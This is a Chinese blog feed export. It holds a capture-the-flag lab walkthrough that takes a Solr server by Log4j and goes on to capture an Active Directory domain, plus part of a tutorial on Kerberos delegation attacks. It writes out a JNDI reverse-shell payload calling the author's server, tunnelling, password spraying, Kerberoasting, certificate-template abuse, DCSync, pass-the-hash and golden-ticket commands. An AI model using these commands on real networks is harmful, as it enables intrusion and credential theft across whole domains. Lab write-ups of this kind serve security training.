    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到ip后还是先使用fscan进行扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 39.98.127.239 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929164056646.png" alt="image-20230929164056646"></p><p>8983端口开了这个服务  是solr</p><p><img src="../images/image-20230929164158696.png" alt="image-20230929164158696"></p><p>查看到版本号  于是Google查找</p><p><a href="https://zgao.top/cve-2021-44228-apache-log4j2-lookup-jndi-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">找了这篇文章  于是进行getshell操作</a></p><p>先测试是否存在这个漏洞</p><p><img src="../images/image-20230929164658642.png" alt="image-20230929164658642"></p><p><img src="../images/image-20230929164707027.png" alt="image-20230929164707027"></p><p>漏洞存在进行getshell操作</p><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>这里的话使用这个工具</p><blockquote><p>JNDIExploit-1.3-SNAPSHOT.jar    <a href="https://github.com/WhiteHSBG/JNDIExploit/releases">https://github.com/WhiteHSBG/JNDIExploit/releases</a></p></blockquote><p><img src="../images/image-20230929164938220.png" alt="image-20230929164938220"></p><p>在自己的vps上启动</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://101.42.39.110:1389/Basic/ReverseShell/101.42.39.110/3389&#125;</span><br></pre></td></tr></table></figure><p><strong>记得把端口给打开</strong></p><p>然后监听3389端口</p><p><img src="../images/image-20230929165107113.png" alt="image-20230929165107113"></p><p>成功  并且成功弹到了shell</p><p>这里查看了一下根目录和home目录  发现没有flag于是就猜测要提权了</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>这里的话就常规三件套了 </p><p><strong>sudo suid 内核  挨个找就行了</strong></p><p><img src="../images/image-20230929165527023.png" alt="image-20230929165527023"></p><p>刚好发现一个以root命令执行的命令  并且不需要密码</p><p><img src="../images/image-20230929165737722.png" alt="image-20230929165737722"></p><p>然后直接找flag</p><p><img src="../images/image-20230929165821122.png" alt="image-20230929165821122"></p><p>然后直接读取就行了</p><p><img src="../images/image-20230929165924783.png" alt="image-20230929165924783"></p><p>接下来就开始内网渗透了</p><h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>先查看内网ip</p><p><img src="../images/image-20230929170013233.png" alt="image-20230929170013233"></p><p>wget传一个fscan进行开扫  <strong>(记得传到tmp目录下 因为这个目录下的权限高)</strong></p><p><img src="../images/image-20230929170712698.png" alt="image-20230929170712698"></p><p>一共发现了这些信息  </p><blockquote><p>172.22.9.7 ——-&gt; 域控主机   3389</p><p>172.22.9.19   —-&gt;  linux服务器</p><p>172.22.9.26 ——&gt;  普通域用户  3389</p><p>172.22.9.47  ——&gt;  apache</p></blockquote><p>于是先从这个使用了apache来搭建的fileserver的地址来入手</p><h3 id="隧道代理"><a href="#隧道代理" class="headerlink" title="隧道代理"></a>隧道代理</h3><p>这里用的是chisel这个工具</p><p><strong>(在代理的那篇文章里有讲到)</strong></p><blockquote><p> ./chisel server -p 1234 —reverse       //vps上运行</p><p>  ./chisel client 101.42.39.110:1234 R:0.0.0.0:7777:socks     //getshell主机上运行</p></blockquote><p><img src="../images/image-20230929171459695.png" alt="image-20230929171459695"></p><p>成功挂上了代理</p><p><strong>(这里的proxychains和proxifier自己百度解决就行)</strong></p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>然后扫描的时候发现了  这个47这台机器开启了445  然后又扫到了这个fileserver服务</p><p>直接无密码登录smb试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient -L 172.22.9.47</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929172011893.png" alt="image-20230929172011893"></p><p>发现可以无密码登录</p><p>于是就去查看他的文件共享文件夹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 smbclient //172.22.9.47/fileshare</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929172231585.png" alt="image-20230929172231585"></p><p>然后使用get命令下载到本地就行了</p><p><img src="../images/image-20230929172316062.png" alt="image-20230929172316062"></p><p>发现给了个SPN的提示   <strong>(先不管  遇到再说)</strong></p><p>在查看文件共享的时候  还发现了个person.db这个文件夹  于是下载到本地进行查看</p><p><img src="../images/image-20230929172834723.png" alt="image-20230929172834723"></p><p>发现了存在四个表</p><ul><li><strong>User表</strong></li></ul><p><img src="../images/image-20230929172909693.png" alt="image-20230929172909693"></p><p>存在了三个用户的密码</p><ul><li><strong>Members表</strong></li></ul><p><img src="../images/image-20230929172953874.png" alt="image-20230929172953874"></p><p><strong>这个表是存在了域里用户的表  (不知道是不是全部)</strong></p><p>然后我们尝试将用户名全部提取出来进行密码喷洒攻击  来找到可以利用用户的账号密码</p><ul><li><strong>提取脚本</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开原始数据文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取指定字符串</span></span><br><span class="line">users = []</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;(\w+)@xiaorang.lab&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        username = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        users.append(username)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存提取后的字符串到 user.txt</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">        file.write(user + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>1.txt直接把members整个表复制进去就行</p><p><img src="../images/image-20230929173220039.png" alt="image-20230929173220039"></p><p>运行之后就会得到所有的用户   </p><p>然后使用这个<code>kerbrute_windows_amd64.exe</code>工具进行密码喷洒攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.22.9.7 -d xiaorang.lab user.txt i9XDE02pLVf</span><br><span class="line"></span><br><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.22.9.7 -d xiaorang.lab user.txt 6N70jt2K9sV</span><br><span class="line"></span><br><span class="line">kerbrute_windows_amd64.exe passwordspray --dc 172.22.9.7 -d xiaorang.lab user.txt fiAzGwEMgTY</span><br></pre></td></tr></table></figure><blockquote><p>2023/09/29 17:44:29 &gt;  [+] VALID LOGIN:  liupeng@xiaorang.lab:fiAzGwEMgTY</p><p>2023/09/29 17:44:04 &gt;  [+] VALID LOGIN:  zhangjian@xiaorang.lab:i9XDE02pLVf</p></blockquote><p>一共就是爆破出这个两个账号  因为上面提示了SPN  于是我们可以枚举一下域里的SPN</p><p><strong>(先是RDP失败了)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929175030774.png" alt="image-20230929175030774"></p><p>不适用-request的话 是只返回域中的所有SPN  包括服务账户  服务主机</p><p>这里使用-request来请求返回域中所有SPN的hash值  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在一般情况下，SPN 的哈希值是根据服务账户的名称生成的，因此可以认为 SPN 的哈希值包含了该服务账户的信息。哈希值是通过对服务账户名称进行哈希运算而得到的固定长度的字符串。</span><br></pre></td></tr></table></figure><p>于是我们尝试爆破服务用户的服务票据   </p><p><img src="../images/image-20230929175802046.png" alt="image-20230929175802046"></p><p>(这里的爆破类型是13100)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929180309246.png" alt="image-20230929180309246"></p><p>爆破成功</p><p><code>zhangxia–MyPass2@@6</code></p><p>尝试rdp登录  </p><p><strong>(这里使用RDP的话注意一点   用户名要这样写<code>zhangxia@XIAORANG.LAB</code>    后面跟着域)</strong></p><p><img src="../images/image-20230929180713709.png" alt="image-20230929180713709"></p><p><strong>成功登录  直接线上sharphood进去收集一下域的信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe --CollectionMethods All --Domain xiaorang.lab --ExcludeDCs</span><br></pre></td></tr></table></figure><p>然后将压缩包复制出来  拖到这个bloodhound里进行分析</p><p><img src="../images/image-20230929180904838.png" alt="image-20230929180904838"></p><p>RBCD条件反应  但是这里题目考察的是CS证书  所以这里没尝试</p><p>这里使用的工具是<code>Certify.exe</code>这个工具  于是尝试进行利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Certify.exe find /vulnerable</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929181907979.png" alt="image-20230929181907979"></p><p>发现确实是存在这个证书模板可以利用</p><p>这里要成功利用要满足三个点<br>1、我们需要有权限去获取证书<br>2、能够登记为客户端身份验证或智能卡登录等<br>3、CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT开启</p><p><strong>(证书可以用于身份验证  所以就是为什么可以利用的原因)</strong></p><p><img src="../images/image-20230929182437803.png" alt="image-20230929182437803"></p><p><img src="../images/80cd55f56f02f549d69e71fa2af90b55.png" alt="img"></p><p>域渗透中和证书服务器相关的利用有ESC1和ESC8  这个exe文件这里没有写  我们拿linux的certify工具进行尝试尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad find -u &#x27;liupeng@xiaorang.lab&#x27;  -password &#x27;fiAzGwEMgTY&#x27; -dc-ip 172.22.9.7 -vulnerable -stdout</span><br></pre></td></tr></table></figure><p>发现域渗透中和证书服务器相关的利用有<code>ESC1</code>和<code>ESC8</code></p><p>这里的话就只存在这个<code>ESC1</code></p><p>开始申请 <code>XR Manager</code> 证书模版并伪造域管理员</p><p><img src="../images/image-20230929183202464.png" alt="image-20230929183202464"></p><p>两个关键参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Certify.exe request /ca:XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA /template:&quot;XR Manager&quot; /altname:XIAORANG.LAB\Administrator</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929183345036.png" alt="image-20230929183345036"></p><p>这里伪造的是域管理员账户  </p><p>新建一个cert.pem  然后把内容复制进去</p><p>然后使用openssl转成pfx文件  就是证书</p><p><strong>(这里转的话在cert.pem内容下面有指令)</strong></p><p><strong>tmd  这里折磨了我好几个小时  因为这个转化的是使用openssl—v1.1版本才行  wtmc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in cert.pem -keyex -CSP &quot;Microsoft Enhanced Cryptographic Provider v1.0&quot; -export -out cert.pfx</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929184411146.png" alt="image-20230929184411146"></p><p>然后将pfx文件复制rdp主机里</p><p>然后使用<code>Rubeus.exe</code>工具来请求票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /password: /ptt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929184709538.png" alt="image-20230929184709538"></p><p>请求域管理员的TGT成功  那么接下来就是想干啥干啥了</p><p><img src="../images/image-20230929184914327.png" alt="image-20230929184914327"></p><p>然后使用mimikatz.exe来获取hash值</p><p><strong>Dc’Sync攻击</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929185431206.png" alt="image-20230929185431206"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.9.26 -u administrator -H2f1b57eefb2d152196836b0516abea80 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</span><br><span class="line"></span><br><span class="line">//ntlm的pth攻击</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230929185650939.png" alt="image-20230929185650939"></p><p>接下来到域控这台主机了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes 00000000000000000000000000000000:2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7</span><br></pre></td></tr></table></figure><p>//hash值的话就是我们前面获取的那个  然后在前面补0就行了</p><p><img src="../images/image-20230929190925467.png" alt="image-20230929190925467"></p><p>成功拿下这台域控</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;拿到ip后还是先使用fscan进行扫描&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;t</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透-约束委派与非约束委派</title>
    <link href="https://ke1nys.github.io/posts/bf224af2.html"/>
    <id>https://ke1nys.github.io/posts/bf224af2.html</id>
    <published>2023-09-29T08:00:26.000Z</published>
    <updated>2023-10-10T02:39:43.444Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/7083788949482635271#heading-7">参考文章1</a>  <a href="https://xz.aliyun.com/t/7217#toc-9">参考文章—xz社区</a></p><p>这个是在打春秋云镜的Certify的靶机的时候遇到的知识点  上一篇是写了RBCD  现在的话把其他两个补齐</p><p><strong>(这里的话复现的话就直接搬别人的截图了  这里就不搭建环境复现了)</strong></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>这里的话  怎么发现约束委派和非约束委派的用户和计算机就不写了</p><p>就写利用方式</p><h2 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h2><ul><li><p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>TRUSTED_FOR_DELEGATION</code></p></li><li><p>当服务账号或者主机被设置为约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且<code>msDS-AllowedToDelegateTo</code>属性会包含被约束的服务</p></li></ul><p>发现域中委派的用户或计算机一般使用的手段是通过<code>LDAP</code>协议（全称：<code>LightweightDirectory Access Protocol</code>）然后通过<code>userAccountControl</code>属性筛选出符合的用户或计算机，我们可以通过<code>ADSI</code>（全称：<code>ActiveDirectory Service Interfaces Editor</code>）来编辑和修改LDAP，<code>adsiedit.msc</code>可以打开<code>ADSI</code>编辑器，打开之后我们找到一个设置了非约束委派的用户，可以看到<code>userAccountControl</code>属性包含了<code>TRUSTED_FOR_DELEGATION</code></p><p><img src="../images/image-20230930153644543.png" alt="image-20230930153644543"></p><p>然后我们再看一下约束委派的用户，同样它的<code>userAccountControl</code>属性包含了<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，但是它比非约束委派的用户多了一个<code>msDS-AllowedToDelegateTo</code>属性，里面包含了允许委派的服务</p><p><img src="../images/image-20230930153759579.png" alt="image-20230930153759579"></p><blockquote><p>注意 ： 委派的用户只能是————————-主机用户和服务用户</p></blockquote><h2 id="为什么需要域委派"><a href="#为什么需要域委派" class="headerlink" title="为什么需要域委派"></a>为什么需要域委派</h2><p>为什么需要域委派呢，比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：<br> 用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。</p><h2 id="域委派流程"><a href="#域委派流程" class="headerlink" title="域委派流程"></a>域委派流程</h2><p><img src="../images/fc96bf11139c4826a7b810c44799622btplv-k3u1fbpfcp-zoom-in-crop-mark1512000.awebp" alt="img"></p><p> 一个域内普通用户jack通过Kerberos协议认证到前台WEB服务后，前台运行 WEB服务的服务账号websvc模拟(Impersonate)用户 jack，以Kerberos 协议继续认证到后台服务器，从而在后台服务器中获取jack用户的访问权限，即域中单跳或者多跳的Kerberos认证。</p><ul><li><p>域内用户 jack 以 Kerberos 方式认证后访问 Web 服务器;</p></li><li><p>Web服务以websvc服务账号运行，websvc向KDC发起jack用户的票据申请;</p></li><li><p>KDC检查websvc用户的委派属性，如果被设置，则返回jack用户的可转发票据 TGT;</p></li><li><p>websvc收到jack用户TGT后，使用该票据向KDC申请访问文件服务器的服务票据ST;</p></li><li><p>KDC检查websvc的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个jack用户访问文件服务的授权票据 ST;</p></li><li><p>websvc收到的jack用户的授权票据ST后，可访问文件服务，完成多跳认证。</p></li></ul><h2 id="委派类型"><a href="#委派类型" class="headerlink" title="委派类型"></a>委派类型</h2><p>一是<strong>非约束性委派(Unconstrained Delegation)</strong> ，服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户<strong>访问<code>任意服务</code></strong></p><p>二是<strong>约束性委派(Constrained Delegation)</strong> ，即Kerberos的扩展协议 <code>S4U2Proxy</code>，服务账号只能获取某用户的ST，从而只能模拟用户<strong>访问特定的服务</strong></p><h2 id="非约束委派的利用"><a href="#非约束委派的利用" class="headerlink" title="非约束委派的利用"></a>非约束委派的利用</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>非约束委派：当user访问service1时，如果service1的服务账号开启了<code>unconstrained delegation</code>（非约束委派），则当<code>user</code>访问<code>service1</code>时会将user的<code>TGT</code>发送给<code>service1</code>并保存在内存中以备下次重用，然后<code>service1</code> 就可以利用这张<code>TGT</code>以user的身份去访问域内的任何服务（任何服务是指user能访问的服务）了</p><p>非约束委派的请求过程（图来自微软手册）：</p><p><img src="../images/image-20230930155439169.png" alt="image-20230930155439169"></p><p>上图的Kerberos请求描述分为如下步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1. 用户向`KDC`发送`KRB_AS_REQ`消息请求可转发的`TGT1`。</span><br><span class="line"></span><br><span class="line">2. KDC在`KRB_AS_REP`消息中返回`TGT1`。</span><br><span class="line"></span><br><span class="line">3. 用户根据步骤2中的TGT1请求转发TGT2。</span><br><span class="line"></span><br><span class="line">4. KDC在KRB_TGS_REP消息中为user返回TGT2。</span><br><span class="line"></span><br><span class="line">5. 用户使用步骤2中返回的TGT1向KDC请求Service1的ST（Service Ticket）</span><br><span class="line"></span><br><span class="line">6. TGS在KRB_TGS_REP消息中返回给用户service1的ST。</span><br><span class="line"></span><br><span class="line">7. 用户发送KRB_AP_REQ消息请求Service1，KRB_AP_REQ消息中包含了TGT1和Service1的ST、TGT2、TGT2的SessionKey</span><br><span class="line"></span><br><span class="line">8. service1使用用户发送过来的的TGT2，并以KRB_TGS_REQ的形式将其发送到KDC，以用户的名义请求service2的ST。</span><br><span class="line"></span><br><span class="line">9. KDC在KRB_TGS_REP消息中返回service2到service1的ST，以及service1可以使用的sessionkey。ST将客户端标识为用户，而不是service1。</span><br><span class="line"></span><br><span class="line">10. service1通过KRB_AP_REQ以用户的名义向service2发出请求。</span><br><span class="line"></span><br><span class="line">11. service2响应service1的请求。</span><br><span class="line"></span><br><span class="line">12. 有了这个响应，service1就可以在步骤7中响应用户的请求。</span><br><span class="line"></span><br><span class="line">13. 这里的TGT转发委派机制没有限制service1使用的TGT2是来自哪个服务，所以service1可以以用户的名义向KDC索要任何其他服务的票证。</span><br><span class="line"></span><br><span class="line">14. KDC返回步骤13中请求的ST</span><br><span class="line"></span><br><span class="line">15-16. service1以用户的名义来请求其它服务</span><br></pre></td></tr></table></figure><p><strong>注</strong>：<code>TGT1（forwardable TGT）</code>用于访问<code>Service1</code>，<code>TGT2（forwarded TGT）</code>用于访问<code>Service2</code></p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>操作环境：</p><ul><li>域：<code>qiyou.com</code></li><li>域控：windows server 2008R2，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code></li><li>域内主机：windows server 2008R2，主机名：<code>DM2008</code>，IP：<code>192.168.141.183</code>，用户：<code>qiyou</code></li></ul><p><strong>注</strong>：在Windows系统中，只有服务账号和主机账号的属性才有委派功能，普通用户默认是没有的</p><p>现在我们将<code>DM2008</code>这个主机用户设置为非约束委派</p><p><img src="../images/image-20230930155737452.png" alt="image-20230930155737452"></p><p>然后我们以<code>administrator</code>的身份通过<code>WinRM</code>服务远程连接<code>DM2008</code></p><p><strong>注</strong>：常见的连接方式还有：MSSQL和IIS，不过我们这里为了方便演示就直接用WinRM了</p><p><img src="../images/image-20230930155754988.png" alt="image-20230930155754988"></p><p>这个时候域管理员的TGT已经缓存在<code>DM2008</code>了，我们用mimikatz即可dump出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930155920433.png" alt="image-20230930155920433"></p><p>可以看到<code>[0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</code>即为域管理<code>administrator</code>的TGT</p><p>此时我们访问域控是被拒绝的</p><p><img src="../images/image-20230930155938080.png" alt="image-20230930155938080"></p><p>然后通过ptt将TGT注入到当前会话中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;1622d8]-2-0-60a00000-Administrator@krbtgt-QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure><p>成功访问</p><p><img src="../images/image-20230930160007761.png" alt="image-20230930160007761"></p><p><strong>注意</strong>：访问域控要用主机名或者是<code>FQDN</code>，使用IP还是会提示<code>拒绝访问</code></p><p><img src="../images/image-20230930160032710.png" alt="image-20230930160032710"></p><p><strong>这里将域管理员的TGT票据注入到本机内存中后  那么我们就拥有了域管理员的权限了</strong></p><p>如果想执行命令的话，我们可以用<code>WinRM</code>服务来远程连接域控服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enter-PSSession -ComputerName WIN-QFPHJSM1L7G</span><br></pre></td></tr></table></figure><ul><li><code>-ComputerName</code>指定主机名</li><li>如果你WinRM服务端口改了的话，可以用<code>-Port</code>指定<code>WinRM</code>端口，默认是<code>5985</code></li></ul><p><img src="../images/image-20230930160204322.png" alt="image-20230930160204322"></p><p><strong>注</strong>：<code>Windows Server 2012</code>及以上默认是开启WinRM服务的，<code>Windows Server 2008 R2</code>需要<code>winrm quickconfig -q</code>来启动<code>WinRM</code>服务，还要注意一点就是这条命令运行后会自动添加防火墙策略，防火墙默认会放行5985端口的。<strong>(这里的话是给被控主机开启这个WinRM服务)</strong></p><h3 id="非约束委派-Spooler打印机服务"><a href="#非约束委派-Spooler打印机服务" class="headerlink" title="非约束委派+Spooler打印机服务"></a>非约束委派+Spooler打印机服务</h3><p>如果只是单纯的非约束委派话需要管理员主动连接，所以在实战环境利用比较鸡肋。</p><p>利用非约束委派+Spooler打印机服务可以强制指定的主机进行连接，这个利用场景是<code>tifkin_</code>，<code>enigma0x3</code>和<code>harmj0y</code>在<code>DerbyCon 2018</code>提出的</p><p>演讲PPT：<a href="https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory">地址</a></p><p>利用原理：利用Windows打印系统远程协议<code>（MS-RPRN）</code>中的一种旧的但是默认启用的方法，在该方法中，域用户可以使用MS-RPRN <code>RpcRemoteFindFirstPrinterChangeNotification（Ex）</code>方法强制任何运行了<code>Spooler</code>服务的计算机以通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。</p><p><strong>(这里的话重点看利用原理就行了    简单易懂)</strong></p><p><strong>注</strong>：<code>Print Spooler</code>服务默认是自动运行的</p><p><img src="../images/image-20230930161150298.png" alt="image-20230930161150298"></p><p><strong>(用自己电脑搜索就行了  是可以看到是默认开启的)</strong></p><p>操作环境：</p><ul><li>域：<code>test.local</code></li><li>域控：系统：<code>Windows server 2012R2</code>主机名：<code>DM2012</code>，ip：<code>192.168.141.134</code></li><li>域内主机：系统：<code>windows 10</code>，主机名：<code>win10</code>，ip：<code>192.168.141.165</code></li></ul><p>这个实现了前提是：需要获取一台主机账户开启了非约束委派域内机器的权限</p><p>我们给win10这个主机账户开启非约束委派</p><p><img src="../images/image-20230930161254235.png" alt="image-20230930161254235"></p><p><strong>注</strong>：是主机账户开启非约束委派，而不是服务用户</p><p><code>tifkin_</code>在他的github上开源了POC：<a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></p><p>向DM2012的<code>Spooler</code>服务发送请求，强制其访问win10进行身份验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SpoolSample.exe dm2012 win10</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930161332611.png" alt="image-20230930161332611"></p><p>然后使用mimikatz.exe导出域管理员的TGT票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p>可以发现成功导出来自<code>DM2012$</code>的TGT</p><p><img src="../images/image-20230930161430370.png" alt="image-20230930161430370"></p><p>得到TGT之后，我们用ptt将票据注入到当前会话后，可以用<code>dcsync</code>导出域控中所有用户的hash，然后用<code>krbtgt</code>用户的hash生成黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;862bdd]-2-0-60a10000-DM2012$@krbtgt-TEST.LOCAL.kirbi</span><br><span class="line"></span><br><span class="line">lsadump::dcsync /domain:test.local /all /csv</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230930161514487.png" alt="image-20230930161514487"></p><p>得到<code>krbtgt</code>用户的hash之后生成一张administrator的黄金票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-662417213-3583657854-423750704 /krbtgt:683545df56ea57b168d0ad090e209616 /ptt</span><br></pre></td></tr></table></figure><p>成功以administrator的身份访问域控</p><p><img src="../images/image-20230930161630690.png" 